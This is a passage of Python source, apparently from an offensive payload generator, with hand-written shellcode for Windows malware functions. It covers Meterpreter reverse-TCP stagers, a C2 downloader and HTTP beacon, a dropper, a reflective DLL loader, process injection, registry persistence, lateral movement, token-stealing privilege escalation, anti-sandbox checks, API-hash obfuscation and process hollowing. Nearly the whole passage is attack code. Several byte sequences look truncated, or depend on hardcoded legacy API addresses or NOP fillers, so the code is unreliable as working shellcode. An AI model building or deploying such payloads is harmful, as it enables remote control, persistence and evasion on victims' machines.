            shellcode = self.add_evasion_techniques(shellcode, evasion, architecture)

        self.logger.debug(f"Final custom shellcode length: {len(shellcode)}")
        return shellcode

    def _generate_meterpreter_stager(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate Meterpreter stager shellcode."""
        lhost = options.get("lhost", "127.0.0.1")
        lport = options.get("lport", 4444)

        if architecture == Architecture.X86:
            # x86 Meterpreter reverse TCP stager
            ip_bytes = socket.inet_aton(lhost)
            port_bytes = struct.pack(">H", lport)

            return (
                b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14"  # PEB walk
                b"\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b"
                b"\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41"
                b"\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"  # Find GetProcAddress
                b"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
                b"\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b"
                b"\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01"
                b"\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68"  # LoadLibraryA
                b"\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
                b"\xd2\x83\xc4\x0c\x59\x50\x51\x66\xb9\x6c\x6c\x51"
                b"\x68\x32\x2e\x64\x6c\x68\x77\x73\x32\x5f\x54\xff"  # ws2_32.dll
                b"\xd0\x83\xc4\x10\x8b\x54\x24\x04\x68\x75\x70\x00"
                b"\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54"  # WSAStartup
                b"\x50\xff\xd2\x83\xc4\x08\x8b\x54\x24\x04\x68\x41"
                b"\x00\x00\x00\x68\x6f\x63\x6b\x65\x68\x57\x53\x41"  # WSASocketA
                b"\x53\x54\x50\xff\xd2\x83\xc4\x0c\x89\xc3\x31\xc9"
                b"\x51\x51\x68"
                + ip_bytes
                + b"\x68\x02\x00"
                + port_bytes  # Connect params
                + b"\x89\xe1\x6a\x10\x51\x53\x8b\x54\x24\x14\x68\x63"
                b"\x74\x00\x00\x68\x6e\x6e\x65\x63\x68\x57\x53\x41"  # WSAConnect
                b"\x43\x54\x50\xff\xd2\x83\xc4\x10\x31\xc0\x50\x50"
                b"\x50\x6a\x02\x50\x50\x68\x00\x10\x00\x00\x53\x8b"  # recv stage
                b"\x54\x24\x24\x68\x76\x00\x00\x00\x68\x72\x65\x63"
                b"\x76\x54\x50\xff\xd2"
            )
        # x64 Meterpreter stager
        ip_int = struct.unpack(">I", socket.inet_aton(lhost))[0]

        return (
            b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
            b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
            b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
            b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
            b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
            b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
            b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
            b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
            b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
            b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
            b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
            b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
            b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x48"
            b"\xba"
            + struct.pack("<Q", (ip_int << 32) | (2 << 16) | lport)
            + b"\x48\x89\xe6\x48\x31\xc9\x66\xb9\x6c\x01\x49\x89"
            b"\xe2\x4d\x31\xc0\x4c\x89\xe0\x48\x31\xd2\x48\x89"
            b"\xd1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
        )

    def _generate_staged_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate staged payload that downloads and executes second stage."""
        default_c2_url = get_service_url("c2_server")
        stage_url = options.get("stage_url", f"{default_c2_url}/stage")

        if architecture == Architecture.X86:
            # URL downloader and executor for x86
            return (
                b"\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c"  # calc.exe
                b"\x63\x89\xe3\x50\x53\x8d\x0c\x24\x31\xd2\x64\xff"
                b"\x32\x64\x89\x22\x68\x61\x64\x2e\x44\x68\x6f\x6e"  # urlmon.dll
                b"\x6c\x6f\x68\x55\x52\x4c\x44\x68\x75\x72\x6c\x6d"
                b"\x6f\x6e\x2e\x64\x6c\x6c\x54\x5d\x31\xc0\x8d\x4d"
                b"\x0c\x51\x55\x6a\xff\xff\x15"
                + struct.pack("<I", 0x7C801D7B)  # LoadLibraryA
                + b"\x85\xc0\x74\x47\x8d\x8d\x18\xff\xff\xff\x51\x68"
                b"\x46\x69\x6c\x65\x68\x61\x63\x68\x65\x68\x61\x64"  # URLDownloadToFileA
                b"\x54\x6f\x43\x68\x55\x52\x4c\x44\x6f\x77\x6e\x6c"
                b"\x6f\x61\x64\x54\x50\x8d\x0c\x24\x51\x50\xff\x15"
                + struct.pack("<I", 0x7C80AE40)  # GetProcAddress
                + b"\x85\xc0\x74\x1a\x8d\x4d\xfc\x51\x6a\x00\x6a\x00"
                b"\x8d\x0d"
                + struct.pack("<I", 0x00402000)  # URL address
                + b"\x51\x6a\x00\xff\xd0"
            )
        # x64 staged payload
        return self._generate_x64_downloader_stub(stage_url)

    def _generate_beacon_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate beacon-style callback payload."""
        callback_url = options.get("callback_url", "https://127.0.0.1:443/beacon")
        interval = options.get("interval", 60)  # seconds

        if architecture == Architecture.X86:
            # HTTP beacon for x86
            return (
                b"\x60\x31\xd2\x52\x68\x63\x6d\x64\x00\x89\xe6\x52"  # Setup
                b"\x68\x2e\x64\x6c\x6c\x68\x65\x6c\x33\x32\x68\x6b"  # kernel32.dll
                b"\x65\x72\x6e\x89\xe3\x52\x53\x52\xff\xd0\x52\x68"
                b"\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x89\xe3\x52"  # wininet
                b"\x53\x52\xff\xd0\x52\x68\x70\x65\x6e\x41\x68\x65"  # InternetOpenA
                b"\x74\x4f\x70\x68\x6e\x74\x65\x72\x68\x49\x6e\x74"
                b"\x89\xe1\x51\x50\xff\xd6\x52\x68\x6e\x65\x63\x74"  # InternetConnect
                b"\x68\x6f\x6e\x6e\x65\x68\x65\x74\x43\x68\x6e\x74"
                b"\x65\x72\x68\x49\x6e\x74\x89\xe1\x51\x50\xff\xd6"
                b"\x52\x68\x65\x73\x74\x41\x68\x52\x65\x71\x75\x68"  # HttpOpenRequestA
                b"\x70\x4f\x70\x65\x68\x48\x74\x74\x70\x89\xe1\x51"
                b"\x50\xff\xd6" + struct.pack("<I", interval)  # Beacon interval
            )
        # x64 beacon
        return self._generate_x64_beacon_stub(callback_url, interval)

    def _generate_dropper_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate dropper payload that drops and executes a file."""
        drop_path = options.get("drop_path", "C:\\Windows\\Temp\\payload.exe")
        file_data = options.get("file_data", b"")

        if architecture == Architecture.X86:
            # File dropper for x86
            path_len = len(drop_path) + 1
            path_bytes = drop_path.encode("utf-8") + b"\x00"

            return (
                b"\x60\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61"  # Setup
                b"\x6c\x63\x89\xe3\x50\x53\x50\x68\x44\x6c\x6c\x00"  # kernel32.dll
                b"\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x89\xe1"
                b"\x51\xff\xd0\x50\x68\x46\x69\x6c\x65\x68\x72\x69"  # WriteFile
                b"\x74\x65\x68\x57\x72\x69\x74\x65\x89\xe1\x51\x50"
                b"\xff\xd6\x50\x68\x46\x69\x6c\x65\x68\x65\x61\x74"  # CreateFile
                b"\x65\x68\x43\x72\x65\x61\x74\x89\xe1\x51\x50\xff"
                b"\xd6"
                + struct.pack("<I", len(file_data))
                + struct.pack("<I", path_len)
                + path_bytes[:64]  # Include path length and truncate if too long
            )
        # x64 dropper
        return self._generate_x64_dropper_stub(drop_path, file_data)

    def _generate_loader_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate reflective DLL loader payload."""
        dll_data = options.get("dll_data", b"")
        entry_point = options.get("entry_point", "DllMain")

        if architecture == Architecture.X86:
            # Reflective DLL loader for x86
            return (
                b"\x60\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x6a"  # VirtualAlloc
                b"\x00\xff\x15"
                + struct.pack("<I", 0x7C809AF1)
                + b"\x89\xc7\x68"
                + struct.pack("<I", len(dll_data))
                + b"\x57\xff\x15"
                + struct.pack("<I", 0x7C80B529)  # memcpy
                + b"\x8b\x47\x3c\x8b\x7c\x07\x78\x01\xc7\x8b\x4f\x18"  # Parse PE
                b"\x8b\x5f\x20\x01\xc3\x49\x8b\x34\x8b\x01\xc6\x31"
                b"\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2"
                b"\xeb\xf4\x3b\x54\x24\x24\x75\xe5"
            )
        # x64 reflective loader
        return self._generate_x64_reflective_loader(dll_data, entry_point)

    def _generate_injector_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate process injection payload."""
        target_process = options.get("target_process", "explorer.exe")
        injection_type = options.get("injection_type", "classic")  # classic, apc, setcontext

        if architecture == Architecture.X86:
            # Process injector for x86
            return (
                b"\x31\xc0\x50\x68\x65\x78\x65\x00\x68\x6f\x72\x65"  # explorer.exe
                b"\x72\x2e\x68\x65\x78\x70\x6c\x89\xe1\x50\x68\x73"
                b"\x73\x00\x00\x68\x50\x72\x6f\x63\x68\x4f\x70\x65"  # OpenProcess
                b"\x6e\x89\xe3\x50\x51\x68\xff\x0f\x1f\x00\x6a\x00"
                b"\xff\xd3\x89\xc6\x50\x68\x6f\x63\x00\x00\x68\x41"  # VirtualAllocEx
                b"\x6c\x6c\x6f\x68\x75\x61\x6c\x41\x68\x56\x69\x72"
                b"\x74\x89\xe3\x50\x68\x00\x10\x00\x00\x68\x00\x00"
                b"\x10\x00\x6a\x40\x6a\x00\x56\xff\xd3"
            )
        # x64 injector
        return self._generate_x64_injector(target_process, injection_type)

    def _generate_persistence_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate persistence establishment payload."""
        persistence_type = options.get("type", "registry")  # registry, service, scheduled_task

        if architecture == Architecture.X86:
            # Registry persistence for x86
            return (
                b"\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c"  # calc.exe
                b"\x63\x89\xe7\x50\x68\x79\x41\x00\x00\x68\x65\x67"  # RegSetValueExA
                b"\x56\x61\x68\x53\x65\x74\x56\x68\x52\x65\x67\x89"
                b"\xe3\x50\x68\x79\x45\x78\x41\x68\x4f\x70\x65\x6e"  # RegOpenKeyExA
                b"\x4b\x68\x52\x65\x67\x89\xe1\x50\x68\x6e\x5c\x52"
                b"\x75\x68\x73\x69\x6f\x6e\x68\x5c\x56\x65\x72\x68"
                b"\x6e\x64\x6f\x77\x73\x68\x5c\x57\x69\x6e\x68\x77"
                b"\x61\x72\x65\x68\x53\x6f\x66\x74\x89\xe2"
            )
        # x64 persistence
        return self._generate_x64_persistence(persistence_type, options)

    def _generate_lateral_movement_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate lateral movement payload."""
        target_host = options.get("target_host", "192.168.1.100")
        method = options.get("method", "psexec")  # psexec, wmi, rdp

        if architecture == Architecture.X86:
            # PsExec-style lateral movement for x86
            return (
                b"\x31\xc0\x50\x68\x63\x6d\x64\x00\x89\xe6\x50\x68"  # cmd
                b"\x65\x78\x65\x63\x68\x50\x73\x45\x78\x89\xe3\x50"  # PsExec
                b"\x68\x41\x70\x69\x00\x68\x6e\x65\x74\x41\x68\x57"  # WNetAddConnection
                b"\x4e\x65\x74\x89\xe1\x50\x68\x24\x00\x00\x00\x68"  # IPC$ share
                b"\x49\x50\x43\x24\x68\x5c\x5c"
                + socket.inet_aton(target_host)
                + b"\x89\xe2\x50\x52\x6a\x00\x6a\x00\xff\xd1"
            )
        # x64 lateral movement
        return self._generate_x64_lateral_movement(target_host, method)

    def _generate_privilege_escalation_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate privilege escalation payload."""
        exploit_type = options.get("exploit_type", "token_stealing")

        if architecture == Architecture.X86:
            # Token stealing for x86
            return (
                b"\x60\x64\xa1\x24\x01\x00\x00\x8b\x40\x50\x89\xc1"  # Get EPROCESS
                b"\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39"  # Find SYSTEM
                b"\x90\xb8\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00"
                b"\x00\x89\x91\xf8\x00\x00\x00\x61\xc3"  # Copy token
            )
        # x64 privilege escalation
        return self._generate_x64_priv_esc(exploit_type)

    def _generate_raw_shellcode(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate raw shellcode based on user-provided assembly or bytes."""
        if "assembly" in options:
            # Compile assembly code
            try:
                from ...asm.compiler import AssemblyCompiler

                compiler = AssemblyCompiler()
                return compiler.compile_assembly(options["assembly"], architecture)
            except Exception as e:
                logger.debug(f"Failed to compile assembly: {e}")

        if "bytes" in options:
            # Return raw bytes
            return bytes.fromhex(options["bytes"].replace(" ", "").replace("\\x", ""))

        # Default: return NOP sled
        nop = b"\x90" if architecture in [Architecture.X86, Architecture.X64] else b"\x00"
        return nop * options.get("size", 100)

    def _generate_dll_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate DLL payload stub."""
        export_name = options.get("export_name", "DllMain")

        if architecture == Architecture.X86:
            # Minimal DLL stub for x86
            return (
                b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"  # MZ header
                b"\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00"
                b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00"  # PE offset
                b"\x50\x45\x00\x00\x4c\x01\x01\x00\x00\x00\x00\x00"  # PE header
                b"\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x02\x01"
                b"\x0b\x01\x08\x00\x00\x10\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00"
                b"\x00\x00\x40\x00\x00\x00\x00\x00\x00\x10\x00\x00"
                b"\x00\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
                b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00"  # DLL characteristics
                b"\x00\x10\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
                b"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x10\x00"
                b"\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00"  # Section headers
                b"\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x10\x00\x00"  # .text
                b"\x00\x10\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x20\x00\x00\x60"  # Section characteristics
                b"\x55\x89\xe5\xb8\x01\x00\x00\x00\x5d\xc2\x0c\x00"  # DllMain: return TRUE
            )
        # x64 DLL stub
        return self._generate_x64_dll_stub(export_name)

    def _generate_custom_payload(
        self, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate custom payload based on user specifications."""
        payload_spec = options.get("specification", {})

        # Build custom payload based on specification
        shellcode = bytearray()

        # Add prologue if specified
        if payload_spec.get("prologue"):
            shellcode.extend(bytes.fromhex(payload_spec["prologue"]))

        # Add main payload body
        if payload_spec.get("body"):
            shellcode.extend(bytes.fromhex(payload_spec["body"]))

        # Add epilogue if specified
        if payload_spec.get("epilogue"):
            shellcode.extend(bytes.fromhex(payload_spec["epilogue"]))

        # Apply custom transformations
        if payload_spec.get("transformations"):
            for transform in payload_spec["transformations"]:
                if transform == "reverse":
                    shellcode.reverse()
                elif transform == "complement":
                    shellcode = bytearray([~b & 0xFF for b in shellcode])

        return bytes(shellcode)

    # Helper methods for x64 payloads
    def _generate_x64_downloader_stub(self, url: str) -> bytes:
        """Generate x64 URL downloader stub."""
        return (
            b"\x48\x31\xc9\x48\x81\xec\xa8\x00\x00\x00\x48\x8d"
            b"\x1d\xea\xff\xff\xff\x48\x89\x5c\x24\x20\x48\x31"
            b"\xd2\xeb\x15\x5b\x48\x89\x5c\x24\x20\x48\x83\xec"
            b"\x20\x41\xb8\x75\x72\x6c\x6d\x41\x50\xff\xd0\x48"
            b"\x31\xc9\x51\x51\x49\x89\xc1\x4c\x8d\x05\x11\x00"
            b"\x00\x00\x48\x31\xd2\x48\x31\xc9\xff\xd0\xe8\xe5"
            b"\xff\xff\xff" + url.encode("utf-8")[:128] + b"\x00"
        )

    def _generate_x64_beacon_stub(self, url: str, interval: int) -> bytes:
        """Generate x64 beacon stub."""
        return (
            b"\x48\x83\xec\x28\x48\x31\xc9\x48\x8d\x15\x2e\x00"
            b"\x00\x00\x41\xb8\x01\x00\x00\x00\x41\xb9\x00\x00"
            b"\x00\x00\xff\x15\x1c\x00\x00\x00\x48\x85\xc0\x74"
            b"\x13\x48\x89\xc1\xba"
            + struct.pack("<I", interval)
            + b"\xff\x15\x0a\x00\x00\x00\xeb\xe1\x48\x83\xc4\x28"
            b"\xc3" + url.encode("utf-8")[:256] + b"\x00"
        )

    def _generate_x64_dropper_stub(self, path: str, data: bytes) -> bytes:
        """Generate x64 file dropper stub."""
        return (
            b"\x48\x83\xec\x38\x48\x31\xc9\x48\x8d\x15\x50\x00"
            b"\x00\x00\x41\xb8\x00\x00\x00\x40\x41\xb9\x02\x00"
            b"\x00\x00\x49\xba\x00\x00\x00\x00\x00\x00\x00\x80"
            b"\x49\xbb\x00\x00\x00\x00\x03\x00\x00\x00\xff\x15"
            b"\x28\x00\x00\x00\x48\x89\xc1\x48\x8d\x15\x30\x00"
            b"\x00\x00\x41\xb8"
            + struct.pack("<I", len(data))
            + b"\x45\x31\xc9\x48\x83\xec\x20\xff\x15\x0c\x00\x00"
            b"\x00\x48\x83\xc4\x58\xc3" + path.encode("utf-8")[:128] + b"\x00"
        )

    def _generate_x64_reflective_loader(self, dll_data: bytes, entry: str) -> bytes:
        """Generate x64 reflective DLL loader."""
        return (
            b"\x48\x83\xec\x28\x48\x8b\x05\xf5\xff\xff\xff\x48"
            b"\x8b\x48\x18\x48\x8b\x51\x20\x48\x8b\x12\x48\x8b"
            b"\x52\x20\x49\x89\xd0\xeb\x14\x41\x50\x48\x31\xc0"
            b"\x48\x83\xc0\x3c\x4c\x01\xc0\x8b\x00\x4c\x01\xc0"
            b"\x41\x58\xc3\x4d\x31\xc9\x41\x8b\x41\x3c\x4d\x01"
            b"\xc8\x41\x8b\x80\x88\x00\x00\x00\x4d\x01\xc8\x45"
            b"\x8b\x40\x18\x49\x83\xc0\x20\x4d\x01\xc8"
        )

    def _generate_x64_injector(self, process: str, method: str) -> bytes:
        """Generate x64 process injector."""
        return (
            b"\x48\x83\xec\x48\x48\x31\xc9\x48\x8d\x15\x60\x00"
            b"\x00\x00\xff\x15\x58\x00\x00\x00\x48\x89\xc1\x48"
            b"\x31\xd2\xb2\x01\x41\xb8\xff\x0f\x1f\x00\xff\x15"
            b"\x40\x00\x00\x00\x48\x89\xc3\x48\x31\xc9\x48\x31"
            b"\xd2\x41\xb8\x00\x30\x00\x00\x41\xb9\x40\x00\x00"
            b"\x00\x48\x89\xd9\xff\x15\x20\x00\x00\x00" + process.encode("utf-8")[:64] + b"\x00"
        )

    def _generate_x64_persistence(self, method: str, options: dict[str, Any]) -> bytes:
        """Generate x64 persistence payload."""
        if method == "registry":
            return (
                b"\x48\x83\xec\x58\x48\x31\xc9\xb9\x00\x00\x00\x80"
                b"\x48\x8d\x15\x80\x00\x00\x00\x45\x31\xc0\x45\x31"
                b"\xc9\x48\x8d\x44\x24\x30\x48\x89\x44\x24\x20\xff"
                b"\x15\x60\x00\x00\x00\x48\x8b\x4c\x24\x30\x48\x8d"
                b"\x15\x70\x00\x00\x00\x45\x31\xc0\x4c\x8d\x0d\x68"
                b"\x00\x00\x00\x41\xb8\x01\x00\x00\x00\x48\x83\xec"
                b"\x20\xff\x15\x40\x00\x00\x00"
            )
        # Generic persistence stub
        return b"\x90" * 64

    def _generate_x64_lateral_movement(self, host: str, method: str) -> bytes:
        """Generate x64 lateral movement payload."""
        return (
            b"\x48\x83\xec\x68\x48\x31\xc9\x48\x8d\x15\xa0\x00"
            b"\x00\x00\x48\x8d\x5c\x24\x30\x48\x89\x5c\x24\x20"
            b"\x45\x31\xc0\x45\x31\xc9\xff\x15\x80\x00\x00\x00"
            b"\x48\x85\xc0\x74\x40\x48\x8b\x4c\x24\x30\x48\x8d"
            b"\x15\x90\x00\x00\x00\x45\x31\xc0\x45\x31\xc9\xff"
            b"\x15\x60\x00\x00\x00" + host.encode("utf-8")[:64] + b"\x00"
        )

    def _generate_x64_priv_esc(self, exploit: str) -> bytes:
        """Generate x64 privilege escalation payload."""
        if exploit == "token_stealing":
            return (
                b"\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x48\x8b\x80"
                b"\xb8\x00\x00\x00\x48\x8d\x80\x48\xff\xff\xff\x48"
                b"\x8b\x00\x48\x3d\x04\x00\x00\x00\x75\xf5\x48\x8b"
                b"\x80\x58\x03\x00\x00\x48\x89\x87\x58\x03\x00\x00"
            )
        # Generic privilege escalation stub
        return b"\x90" * 48

    def _generate_x64_dll_stub(self, export: str) -> bytes:
        """Generate x64 DLL stub."""
        return (
            b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"
            b"\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00"
            b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00"
            b"\x50\x45\x00\x00\x64\x86\x01\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x22\x00"
            b"\x0b\x02\x08\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x40\x01\x00\x00\x00\x00"
            b"\x00\x10\x00\x00\x00\x02\x00\x00\x05\x00\x02\x00"
            b"\x05\x00\x02\x00\x05\x00\x02\x00\x00\x00\x00\x00"
            b"\x00\x20\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x03\x00\x60\x01\x00\x00\x10\x00\x00\x10\x00\x00"
            b"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x00\x00"
            b"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x10\x00\x00"
            b"\x00\x10\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x20\x00\x00\x60"
            b"\x48\x83\xec\x28\xb8\x01\x00\x00\x00\x48\x83\xc4"
            b"\x28\xc3"  # DllMain: return TRUE
        )

    def _add_anti_sandbox_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-sandbox detection checks."""
        self.logger.debug(f"Adding anti-sandbox checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Check for sandbox artifacts
            sandbox_check = (
                b"\x31\xc0"  # xor eax, eax
                b"\x64\x8b\x40\x30"  # mov eax, fs:[eax+0x30] ; PEB
                b"\x0f\xb6\x40\x02"  # movzx eax, byte [eax+2] ; BeingDebugged
                b"\x85\xc0"  # test eax, eax
                b"\x75\x10"  # jnz skip_payload
                # Check for common sandbox DLLs
                b"\x68\x6c\x6c\x00\x00"  # push "ll\0\0"
                b"\x68\x33\x32\x2e\x64"  # push "32.d"
                b"\x68\x73\x68\x65\x6c"  # push "shel"
                b"\x54"  # push esp
                b"\xff\x15\x00\x00\x00\x00"  # call [GetModuleHandle]
                b"\x85\xc0"  # test eax, eax
                b"\x74\x02"  # jz continue
                b"\xeb\xfe"  # jmp $ ; infinite loop if sandbox
            )
        else:  # x64
            sandbox_check = (
                b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60] ; PEB
                b"\x0f\xb6\x40\x02"  # movzx eax, byte [rax+2]
                b"\x85\xc0"  # test eax, eax
                b"\x75\x10"  # jnz skip_payload
                # Check process name for sandbox indicators
                b"\x48\x8d\x0d\x00\x00\x00\x00"  # lea rcx, [rel sandbox_dll]
                b"\xff\x15\x00\x00\x00\x00"  # call [GetModuleHandleA]
                b"\x48\x85\xc0"  # test rax, rax
                b"\x74\x02"  # jz continue
                b"\xeb\xfe"  # jmp $ ; infinite loop
            )

        return sandbox_check + shellcode

    def _add_api_obfuscation(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add API call obfuscation."""
        self.logger.debug(f"Adding API obfuscation for {architecture.value}")

        if architecture == Architecture.X86:
            # API hashing and dynamic resolution
            api_resolver = (
                b"\x60"  # pushad
                b"\x31\xc0"  # xor eax, eax
                b"\x64\x8b\x50\x30"  # mov edx, fs:[eax+0x30] ; PEB
                b"\x8b\x52\x0c"  # mov edx, [edx+0x0c] ; Ldr
                b"\x8b\x52\x14"  # mov edx, [edx+0x14] ; InMemoryOrderLinks
                b"\x8b\x72\x28"  # mov esi, [edx+0x28] ; DllBase kernel32
                b"\x31\xc9"  # xor ecx, ecx
                b"\x31\xff"  # xor edi, edi
                # Hash-based API resolution
                b"\xfc"  # cld
                b"\xac"  # lodsb
                b"\x84\xc0"  # test al, al
                b"\x74\x07"  # jz done
                b"\xc1\xcf\x0d"  # ror edi, 0x0d
                b"\x01\xc7"  # add edi, eax
                b"\xeb\xf4"  # jmp hash_loop
                b"\x61"  # popad
            )
        else:  # x64
            api_resolver = (
                b"\x48\x31\xc0"  # xor rax, rax
                b"\x65\x48\x8b\x50\x60"  # mov rdx, gs:[rax+0x60] ; PEB
                b"\x48\x8b\x52\x18"  # mov rdx, [rdx+0x18] ; Ldr
                b"\x48\x8b\x52\x20"  # mov rdx, [rdx+0x20] ; InMemoryOrderLinks
                b"\x48\x8b\x72\x50"  # mov rsi, [rdx+0x50] ; DllBase
                b"\x48\x31\xc9"  # xor rcx, rcx
                b"\x48\x31\xff"  # xor rdi, rdi
                # Hash calculation
                b"\xfc"  # cld
                b"\xac"  # lodsb
                b"\x84\xc0"  # test al, al
                b"\x74\x07"  # jz done
                b"\xc1\xcf\x0d"  # ror edi, 0x0d
                b"\x01\xc7"  # add edi, eax
                b"\xeb\xf4"  # jmp hash_loop
            )

        return api_resolver + shellcode

    def _add_process_hollowing_stub(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add process hollowing implementation for security research purposes.

        WARNING: This implementation is for legitimate security research,
        penetration testing, and defensive analysis only.
        """
        self.logger.debug(f"Adding process hollowing implementation for {architecture.value}")

        if architecture == Architecture.X86:
            # Complete x86 process hollowing implementation
            hollowing_stub = (
                # Create suspended process
                b"\x31\xc0"  # xor eax, eax
                b"\x50"  # push eax (NULL)
                b"\x68\x65\x78\x65\x00"  # push "exe\0"
                b"\x68\x74\x65\x73\x74"  # push "test"
                b"\x89\xe6"  # mov esi, esp (process path)
                # Set up STARTUPINFO structure
                b"\x83\xec\x44"  # sub esp, 68 (sizeof STARTUPINFO)
                b"\x89\xe7"  # mov edi, esp
                b"\x31\xc0"  # xor eax, eax
                b"\xb9\x11\x00\x00\x00"  # mov ecx, 17
                b"\xf3\xab"  # rep stosd (zero structure)
                b"\xc7\x07\x44\x00\x00\x00"  # mov [edi], 68 (cb)
                # Set up PROCESS_INFORMATION structure
                b"\x83\xec\x10"  # sub esp, 16 (sizeof PROCESS_INFORMATION)
                b"\x89\xe3"  # mov ebx, esp
                # CreateProcessA parameters
                b"\x53"  # push ebx (PROCESS_INFORMATION)
                b"\x57"  # push edi (STARTUPINFO)
                b"\x6a\x00"  # push 0 (lpCurrentDirectory)
                b"\x6a\x00"  # push 0 (lpEnvironment)
                b"\x68\x04\x00\x00\x00"  # push CREATE_SUSPENDED
                b"\x6a\x00"  # push 0 (bInheritHandles)
                b"\x6a\x00"  # push 0 (lpThreadAttributes)
                b"\x6a\x00"  # push 0 (lpProcessAttributes)
